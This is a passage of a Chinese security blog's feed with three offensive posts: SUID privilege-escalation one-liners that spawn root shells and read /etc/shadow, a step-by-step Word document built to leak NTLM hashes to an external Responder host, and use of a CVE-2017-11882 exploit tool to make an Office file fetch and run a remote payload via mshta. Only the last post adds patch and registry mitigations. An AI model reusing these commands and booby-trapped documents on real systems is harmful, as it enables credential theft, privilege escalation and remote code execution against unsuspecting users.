class="headerlink" title="9.awk"></a>9.awk</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">'BEGIN &#123;system("/bin/bash")&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="10-man"><a href="#10-man" class="headerlink" title="10.man"></a>10.man</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><h2 id="11-python-perl-ruby-lua-etc"><a href="#11-python-perl-ruby-lua-etc" class="headerlink" title="11.python/perl/ruby/lua/etc"></a>11.python/perl/ruby/lua/etc</h2><p>perl<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> <span class="string">"/bin/bash"</span>;</span><br></pre></td></tr></table></figure></p><p>python<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"/bin/bash"</span>)</span><br></pre></td></tr></table></figure></p><h2 id="12-tcpdump"><a href="#12-tcpdump" class="headerlink" title="12.tcpdump"></a>12.tcpdump</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $<span class="string">'id\ncat /etc/shadow'</span> &gt; /tmp/.<span class="built_in">test</span></span><br><span class="line">chmod +x /tmp/.<span class="built_in">test</span></span><br><span class="line">sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.<span class="built_in">test</span> -Z root</span><br></pre></td></tr></table></figure><p>欢迎补充。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Linux提权中，可以用的SUID文件来提权，SUID的作用就是：让本来没有相应权限的用户运行这个程序时，可以访问没有权限访问的资源。通常可以使用一下命令来找有SUID标志位的文件：&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;
      
    
    </summary>
    
      <category term="奇技淫巧" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="Privilege Escalation" scheme="https://evi1cg.github.io/tags/Privilege-Escalation/"/>
    
  </entry>
  
  <entry>
    <title>通过Microsoft Office 窃取 NTLM Hashes</title>
    <link href="https://evi1cg.github.io/archives/Get_NTLM_Hashes.html"/>
    <id>https://evi1cg.github.io/archives/Get_NTLM_Hashes.html</id>
    <published>2017-12-19T19:02:00.000Z</published>
    <updated>2019-01-15T05:43:36.769Z</updated>
    
    <content type="html"><![CDATA[<p>之前有人总结了很多种窃取NTLM hash的方法，<a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">原文</a>,<a href="https://paper.seebug.org/474/" target="_blank" rel="noopener">译文</a>。里面写的方法已经很多了，最近从<a href="https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/" target="_blank" rel="noopener">这里</a>又学到了一个新的方法，所以在这里进行一下分享，也算是一个补充。</p><p>历史上，Microsoft Word被用作HTML编辑器。这意味着它可以支持HTML元素，例如框架集。因此，可以将Microsoft Word文档与UNC路径链接起来，并将其与响应程序结合，以便从外部捕获NTLM哈希值。带有docx扩展名的Word文档实际上是一个包含各种XML文档的zip文件。这些XML文件正在控制主题，字体，文档的设置和Web设置。</p><p>所以我们可以新建一个任意文档，并用压缩包来打开他。</p><p><img src="https://evi1cg.github.io/usr/uploads/2017/12/72758607.png" alt="1513736341443.png"></p><p>在<em><code>word</code></em> 目录下有一个webSettings.xml。我们对这个文件进行修改，添加以下代码则会创建与另外一个文件的链接。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:w</span> <span class="attr">w:val</span>=<span class="string">"60"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:color</span> <span class="attr">w:val</span>=<span class="string">"auto"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:noBorder</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:name</span> <span class="attr">w:val</span>=<span class="string">"3"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:sourceFileName</span> <span class="attr">r:id</span>=<span class="string">"rId1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:linkedToFile</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>最终修改后的webSettings.xml如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:webSettings</span> <span class="attr">xmlns:mc</span>=<span class="string">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span> <span class="attr">xmlns:r</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span> <span class="attr">xmlns:w</span>=<span class="string">"http://schemas.openxmlformats.org/wordprocessingml/2006/main"</span> <span class="attr">xmlns:w14</span>=<span class="string">"http://schemas.microsoft.com/office/word/2010/wordml"</span> <span class="attr">mc:Ignorable</span>=<span class="string">"w14"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:w</span> <span class="attr">w:val</span>=<span class="string">"60"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:color</span> <span class="attr">w:val</span>=<span class="string">"auto"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:noBorder</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:name</span> <span class="attr">w:val</span>=<span class="string">"3"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:sourceFileName</span> <span class="attr">r:id</span>=<span class="string">"rId1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:linkedToFile</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:optimizeForBrowser</span>/&gt;</span><span class="tag">&lt;<span class="name">w:allowPNG</span>/&gt;</span><span class="tag">&lt;/<span class="name">w:webSettings</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>现在我们把新的webSettings.xml替换原来的webSettings.xml，之后在word目录下的_rels目录创建一个新的文件 <em><code>webSettings.xml.rels</code></em>，文件内容如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Relationships</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/relationships"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Relationship</span> <span class="attr">Id</span>=<span class="string">"rId1"</span> <span class="attr">Type</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame"</span> <span class="attr">Target</span>=<span class="string">"\\172.16.103.130\Updates.docx"</span> <span class="attr">TargetMode</span>=<span class="string">"External"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Relationships</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>在这里包含了UNC路径。指向我们的Responder。</p><p>之后把文档重新命名为docx。开启Responder<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -wrf</span><br></pre></td></tr></table></figure></p><p>打开word，则可获取到hash</p><p><img src="https://evi1cg.github.io/usr/uploads/2017/12/2707838865.png" alt="1513737175195.png"></p><p>当然，使用DDE的方式以及CVE-2017-0199等其他的方式都是可以的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前有人总结了很多种窃取NTLM hash的方法，&lt;a href=&quot;https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/&quot; target=&quot;_blank&quot; rel
      
    
    </summary>
    
      <category term="奇技淫巧" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="gethash" scheme="https://evi1cg.github.io/tags/gethash/"/>
    
      <category term="office" scheme="https://evi1cg.github.io/tags/office/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-11882利用</title>
    <link href="https://evi1cg.github.io/archives/CVE_2017_11882_exp.html"/>
    <id>https://evi1cg.github.io/archives/CVE_2017_11882_exp.html</id>
    <published>2017-11-20T21:32:00.000Z</published>
    <updated>2019-01-16T05:42:11.477Z</updated>
    
    <content type="html"><![CDATA[<p>最近这段时间CVE-2017-11882挺火的。关于这个漏洞可以看看这里:<a href="http://www.freebuf.com/vuls/154462.html" target="_blank" rel="noopener">隐藏17年的Office远程代码执行漏洞POC样本分析（CVE-2017-11882）</a>。</p><p>今天在twitter上看到有人共享了一个POC，<a href="https://twitter.com/gossithedog/status/932694287480913920" target="_blank" rel="noopener">twitter地址</a>，<a href="http://owned.lab6.com/~gossi/research/public/cve-2017-11882/" target="_blank" rel="noopener">poc地址</a>，后来又看到有人共享了一个项目<a href="https://github.com/embedi/CVE-2017-11882" target="_blank" rel="noopener">CVE-2017-11882</a>，简单看了一下这个项目，通过对rtf文件的修改来实现命令执行的目的，但是有个缺陷就是，这个项目使用的是使用webdav的方式来执行远程文件的，使用起来可能并不容易，所以就对此文件进行了简单的修改，具体项目地址如下：GIT：<a href="https://github.com/ridter/CVE-2017-11882" target="_blank" rel="noopener">CVE-2017-11882</a> 。<br>使用方式很简单，如果要执行命令<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Command_CVE<span class="number">-2017</span><span class="number">-11882.</span>py -c <span class="string">"cmd.exe /c calc.exe"</span> -o test.doc</span><br></pre></td></tr></table></figure></p><p>demo<br><img src="https://evi1cg.github.io/usr/uploads/2017/11/office.gif" alt="demo"></p><p>关于怎么进一步利用，可以参考之前写的<a href="https://evi1cg.github.io/archives/remote_exec.html">《windows命令执行漏洞不会玩？ 看我！》</a>，由于有长度的限制，这里可以采用mshta的方式来执行。构造的命令如下：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Command_CVE<span class="number">-2017</span><span class="number">-11882.</span>py -c <span class="string">"mshta http://site.com/abc"</span> -o test.doc</span><br></pre></td></tr></table></figure></p><p>最终效果如下：<br><img src="https://evi1cg.github.io/usr/uploads/2017/11/1656106605.gif" alt="1.gif"></p><p><strong>解决方案：</strong></p><p>1、微软已经对此漏洞做出了修复。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)下载https:<span class="regexp">//</span>portal.msrc.microsoft.com<span class="regexp">/en-US/</span>security-guidance<span class="regexp">/advisory/</span>CVE-<span class="number">2017</span>-<span class="number">11882</span>  更新补丁进行修补</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)开启Windows Update功能，定期对系统进行自动更新</span><br></pre></td></tr></table></figure></p><p>2、由于该公式编辑器已经17年未做更新，可能存在大量安全漏洞，建议在注册表中取消该模块的注册。</p><p>按下Win+R组合键，打开cmd.exe</p><p>对应office版本修改以下注册表路径以后，输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Microsoft\Office\XX.X\Common\COM Compatibility\&#123;0002CE02-0000- 0000-C000-000000000046&#125;"</span> /v <span class="string">"Compatibility Flags"</span> /t REG_DWORD /d 0x400</span><br><span class="line"></span><br><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\XX.X\Common\COM Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125;"</span> /v <span class="string">"Compatibility Flags"</span> /t REG_DWORD /d 0x400</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近这段时间CVE-2017-11882挺火的。关于这个漏洞可以看看这里:&lt;a href=&quot;http://www.freebuf.com/vuls/154462.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;隐藏17年的Office远程代码执行漏
      
    
    </summary>
    
      <category term="奇技淫巧" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="office" scheme="https://evi1cg.github.io/tags/office/"/>
    
  </entry>
  
</feed>
